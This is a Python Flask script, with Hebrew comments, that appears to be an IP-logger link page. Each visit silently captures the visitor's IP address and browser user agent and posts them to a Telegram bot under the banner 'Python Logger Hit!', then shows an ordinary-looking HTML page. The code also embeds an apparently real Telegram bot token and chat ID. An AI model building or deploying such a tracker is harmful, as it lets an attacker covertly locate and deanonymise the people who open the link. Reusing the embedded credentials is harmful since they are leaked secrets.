from flask import Flask, render_template, request, redirect
import requests
import os

app = Flask(__name__)

# הגדרות הטלגרם שלך
BOT_TOKEN = "8289963160:AAHUHWP1gLDyuw5awuVsPUyJwNeUK_aOK3I"
CHAT_ID = "7702533038"

def send_to_telegram(ip, user_agent):
    message = f"🎯 **Python Logger Hit!**\n🌐 IP: `{ip}`\n💻 Browser: `{user_agent}`"
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": CHAT_ID,
        "text": message,
        "parse_mode": "Markdown"
    }
    try:
        requests.post(url, json=payload)
    except Exception as e:
        print(f"Error sending to Telegram: {e}")

@app.route('/')
def index():
    # שליפת ה-IP והדפדפן
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    user_agent = request.headers.get('User-Agent')
    
    # שליחה לטלגרם
    send_to_telegram(ip, user_agent)
    
    # הצגת דף ה-HTML מתוך תיקיית templates
    return render_template('index.html')

if __name__ == '__main__':
    # הפעלה על פורט 8080 (מתאים לרוב השרתים)
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 8080)))
